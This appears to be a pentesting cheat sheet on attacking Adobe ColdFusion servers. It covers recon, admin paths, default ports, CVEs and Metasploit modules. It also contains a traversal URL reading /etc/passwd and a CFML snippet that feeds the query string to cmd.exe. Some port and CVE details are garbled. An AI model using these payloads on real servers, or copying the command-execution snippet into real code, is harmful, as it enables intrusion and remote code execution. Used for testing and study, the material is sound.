ColdFusion is a programming language and a web application development platform based on Java. ColdFusion was initially developed by the Allaire Corporation in 1995 and was acquired by Macromedia in 2001. 
Macromedia was later acquired by Adobe Systems, which now owns and develops ColdFusion.
It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion was first released in 1995 and has since evolved into a powerful and versatile platform for web development.
ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion to develop dynamic web applications. 
It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. 
Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks.


### Starting point
Do a initial scan with NMAP usually coldfusion is identified as fmtp on port 8500.
8500 default port for SSL. .**cfm extension is the default one.**


### Admin page
You can surf thru them and eventually you could find the login portal ex: `/CFIDE/administrator`


### Default Ports

```
Port  	Protocol 	Description
80 		HTTP 		Used for non-secure HTTP communication between the web server and web browser.
443 	HTTPS 		Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.
1935 	RPC 		Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.
25 		SMTP 		Simple Mail Transfer Protocol (SMTP) is used for sending email messages.
8500 	SSL 		Used for server communication via Secure Socket Layer (SSL).
5500 	SrvMonitor 	Used for remote administration of the ColdFusion server.
```


### Known CVEs
*CVE-2021-21087: Arbitrary disallow of uploading JSP source code*
*CVE-2020-24453: Active Directory integration misconfiguration*
*CVE-2020-24450: Command injection vulnerability*
*CVE-2020-24449: Arbitrary file reading vulnerability*
*CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability*


#  Attacks
### Path Trasversal Attacking
Adobe ColdFusion - Directory Traversal (Metasploit)               | `multiple/remote/16985.rb`
`auxiliary/scanner/http/coldfusion_locale_traversal`
(Ready to use payload in Metasploit)

Code snippet (will iterate and show thru all files from /upload folder):
`<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">`
`<cfloop query="fileList">`
    `<a href="uploads/#fileList.name#">#fileList.name#</a><br>`
`</cfloop>`

The exploit is in the directory and can be exploited to get Directory Trasversal: http://example.com/index.cfm?directory=../../../etc/&file=passwd

### CVE
CVE-2010-2861
(Affected version 9.0.1 or before)
CVE-2009-2265

### Unauth RCE
`exploit/windows/http/coldfusion_fckeditor`
(Ready to use payload in Metasploit)

Code snippet (will execute some code on the backend without auth)
`<cfset cmd = "#cgi.query_string#">`
`<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">`
